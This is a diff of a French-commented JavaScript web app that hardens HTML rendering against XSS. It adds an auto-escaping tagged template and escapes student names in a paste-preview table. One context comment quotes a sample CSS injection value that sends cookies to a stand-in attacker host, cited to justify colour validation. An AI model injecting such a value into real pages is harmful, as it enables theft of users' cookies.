@@ -8378,6 +8378,23 @@ function _escAttr(s) {
 // `${stu.nom}`, `${cls.nom}`, etc.
 function _escName(s) { return _escAttr(s == null ? '' : String(s)); }
 
+// Tagged template AUTO-ÉCHAPPANT pour le HTML — à privilégier dans le code NOUVEAU.
+// Toute interpolation `${x}` est échappée par défaut (HTML-safe). Pour insérer un
+// FRAGMENT HTML déjà construit et sûr (sous-template, libellé constant…), l'envelopper
+// dans `_rawHtml(fragment)` afin de signaler explicitement l'intention.
+//   el.innerHTML = _html`<td>${stu.nom}</td>${_rawHtml(badgesHtml)}`;
+// → `stu.nom` est échappé, `badgesHtml` injecté tel quel. Plus de XSS par oubli d'_esc.
+function _rawHtml(s) { return { __raw: String(s == null ? '' : s) }; }
+function _html(strings, ...values) {
+  let out = strings[0];
+  for (let i = 0; i < values.length; i++) {
+    const v = values[i];
+    out += (v && typeof v === 'object' && '__raw' in v) ? v.__raw : _escAttr(v);
+    out += strings[i + 1];
+  }
+  return out;
+}
+
 // Validation d'une couleur CSS avant injection inline (`style="background:${...}"`).
 // Empêche l'injection CSS via une couleur malveillante (ex. tag.color forgé via
 // JSON tiers contenant `red;background:url(https://atk/?cookie)`).
@@ -11279,9 +11296,9 @@ function msePaste(e) {
     </tr></thead>
     <tbody>` + rows.map(row => {
     const bg      = row.warn ? '#fff0f0' : (row.key ? '#f0fff4' : '#fafafa');
-    const stuName = row.stu  ? `${row.stu.prenom} ${row.stu.nom}` : '<em style="color:#bbb">—</em>';
-    const lblDisp = row.lbl  ? row.lbl.toUpperCase() : '<em style="color:#bbb">—</em>';
-    const state   = row.warn ? `⚠ ${row.warn}` : (row.key ? '✅ OK' : '<em style="color:#bbb">—</em>');
+    const stuName = row.stu  ? `${_escName(row.stu.prenom)} ${_escName(row.stu.nom)}` : '<em style="color:#bbb">—</em>';
+    const lblDisp = row.lbl  ? _escAttr(row.lbl.toUpperCase()) : '<em style="color:#bbb">—</em>';
+    const state   = row.warn ? `⚠ ${_escAttr(row.warn)}` : (row.key ? '✅ OK' : '<em style="color:#bbb">—</em>');
     return `<tr style="background:${bg}">
       <td style="padding:3px 8px;border-bottom:1px solid #eee">${stuName}</td>
       <td style="padding:3px 8px;border-bottom:1px solid #eee;font-family:monospace">${lblDisp}</td>
